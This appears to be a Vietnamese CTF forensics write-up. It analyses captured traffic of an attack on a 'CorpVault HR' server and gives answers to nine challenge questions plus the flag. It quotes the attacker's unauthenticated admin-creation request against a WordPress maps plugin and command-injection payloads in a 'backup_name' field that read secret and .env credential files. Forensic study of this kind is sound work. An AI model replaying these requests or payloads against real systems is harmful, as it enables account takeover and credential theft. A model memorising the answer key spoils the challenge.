# Basic QnA - Forensics Writeup

## Thông tin

- **Tên bài:** Basic QnA
- **Thể loại:** Forensics / Network Analysis
- **URL:** https://basicqna.v1t.site
- **File đính kèm:** `challenge.pcapng`
- **Flag:** `v1t{llm_c0uld_s0lv3_th1s_ez_chall3ng3!!!}`

## Tổng quan

Bài cho một file `challenge.pcapng` chứa traffic mạng ghi lại quá trình một attacker tấn công vào hệ thống **CorpVault HR**. Nhiệm vụ là phân tích file pcapng để trả lời 9 câu hỏi trên website `basicqna.v1t.site`. Mỗi câu hỏi có tối đa 3 lần thử sai trước khi session bị reset.

---

## Phân tích chi tiết

### Q1. Attacker IP và Victim IP?

**Format:** `attackerIP,victimIP`

Mở file pcapng bằng Wireshark hoặc dùng scapy để phân tích. Trong traffic có hai IP chính giao tiếp:

- **172.29.9.159** — IP thực hiện port scan (SYN scan) và các request tấn công → **Attacker**
- **13.212.67.96** — Server bị tấn công chạy CorpVault HR → **Victim**

> **Đáp án:** `172.29.9.159,13.212.67.96`

---

### Q2. SSH service/version trên victim?

**Format:** SSH version string

Lọc traffic SSH (port 22) và tìm SSH banner exchange. Server trả về banner:

```
SSH-2.0-OpenSSH_10.2p1 Ubuntu-2ubuntu3.2
```

> **Đáp án:** `OpenSSH_10.2p1 Ubuntu-2ubuntu3.2`

---

### Q3. Attacker dùng tool gì để reconnaissance?

Phân tích traffic cho thấy một lượng lớn SYN packets gửi đến nhiều port khác nhau trên victim trong thời gian rất ngắn — đây là đặc trưng của **nmap SYN scan**.

> **Đáp án:** `nmap`

---

### Q4. TCP stream nào cho thấy attacker tạo thành công temporary admin account?

**Format:** `tcp.stream eq XXXX`

Đây là câu khó nhất. Cần tìm stream chứa response có `"Temporary support access created"`.

**Lưu ý quan trọng:** Stream ID phải lấy từ **Wireshark/tshark**, không thể tự tính bằng Python/scapy vì thuật toán gán `tcp.stream` của Wireshark khác với cách thủ công.

Dùng tshark để tìm:

```bash
tshark -r challenge.pcapng -Y 'frame contains "Temporary support access"' \
  -T fields -e frame.number -e tcp.stream
```

Output:
```
47452   4491
47641   4498
48216   4517
```

Packet #47452 (stream 4491) là lần đầu tiên attacker tạo thành công temp admin account qua exploit plugin WP Maps Pro:

```
POST /wp-admin/admin-ajax.php
action=wpgmp_temp_access_ajax&nonce=fc-call-nonce-7d91c2c0&check_temp=false
```

Response:
```json
{
  "message": "Temporary support access created.",
  "role": "admin",
  "success": true,
  "support_url": "http://13.212.67.96/magic-login/GsheBj53E0_rg1qnYAnIQYgNBJcGMzbL",
  "user": "support_c30cde@corpvault.local"
}
```

> **Đáp án:** `tcp.stream eq 4491`

---

### Q5. Tài khoản admin tạm thời là gì?

**Format:** `username@domain`

Từ response ở Q4, trường `"user"` chứa tài khoản:

> **Đáp án:** `support_c30cde@corpvault.local`

---

### Q6. CVE của kỹ thuật bị lợi dụng?

Plugin **WP Maps Pro** (wp-google-map-gold) có lỗ hổng cho phép unauthenticated user tạo admin account thông qua AJAX action `wpgmp_temp_access_ajax`. Action này được đăng ký qua `wp_ajax_nopriv_` hook và nonce được public trên mọi trang.

> **Đáp án:** `CVE-2026-8732`

---

### Q7. Parameter nào trong backup feature bị lợi dụng để RCE?

Sau khi có admin access, attacker truy cập `/admin/maintenance` và gửi POST request với command injection qua parameter `backup_name`:

```
backup_name=daily-contracts; whoami; ls /
backup_name=daily-contracts; cat /var/tmp/secret.txt
backup_name=daily-contracts; cat /app/static/.env
...
```

Server dùng `backup_name` trực tiếp trong shell command mà không sanitize → **OS Command Injection**.

> **Đáp án:** `backup_name`

---

### Q8. Attacker đọc 2 file nào sau khi RCE?

**Format:** `path1,path2`

Từ danh sách các RCE command, attacker dùng `cat` để đọc các file:

1. `cat /app/static/.env` — chứa GitHub PAT token
2. `cat /app/templates/.env` — chứa GitHub username/repo

> **Đáp án:** `/app/static/.env,/app/templates/.env`

---

### Q9. Github ID tìm được là gì?

**Format:** final magic string

Nội dung file `.env` leak ra:

- `/app/static/.env`:
  ```
  Ich1ck3nPlus:github_pat_11CGU...[REDACTED_CTF_TOKEN]...jvqd
  ```
- `/app/templates/.env`:
  ```
  Ich1ck3nPlus/final
  ```

Github ID là **Ich1ck3nPlus**.

> **Đáp án:** `Ich1ck3nPlus`

---

## Attack Chain Summary

```
1. Nmap SYN scan (reconnaissance)
         │
         ▼
2. Phát hiện CorpVault HR web app (port 80)
         │
         ▼
3. Exploit CVE-2026-8732 (WP Maps Pro plugin)
   - Lấy nonce public từ JavaScript trên page
   - POST /wp-admin/admin-ajax.php với action=wpgmp_temp_access_ajax
   - Nhận magic login URL + admin account
         │
         ▼
4. Login qua magic-login URL → admin session
         │
         ▼
5. OS Command Injection qua /admin/maintenance
   - Parameter: backup_name
   - Payload: daily-contracts; <command>
         │
         ▼
6. Đọc sensitive files
   - /app/static/.env (GitHub PAT)
   - /app/templates/.env (GitHub repo)
         │
         ▼
7. Leak GitHub credentials: Ich1ck3nPlus
```

## Flag

```
v1t{llm_c0uld_s0lv3_th1s_ez_chall3ng3!!!}
```
